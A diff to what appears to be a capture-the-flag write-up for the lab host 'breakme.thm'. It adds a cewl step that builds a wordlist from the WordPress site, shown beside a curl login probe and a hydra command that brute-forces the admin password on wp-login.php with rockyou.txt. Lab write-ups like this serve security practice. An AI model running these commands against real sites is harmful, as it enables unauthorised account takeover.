@@ -344,6 +344,10 @@ curl -s -X POST http://breakme.thm/wordpress/wp-login.php \
   -d "log=admin&pwd=wrongpassword&wp-submit=Log+In" | grep -i error
 
 ```
+### Grab usernames
+```bash
+cewl -d 2 http://breakme.thm/wordpress/ -w usernames.txt
+```
 ```bash
 > hydra -l admin -P /usr/share/wordlists/rockyou.txt breakme.thm http-post-form \
 "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:login_error" -V -f >/dev/null
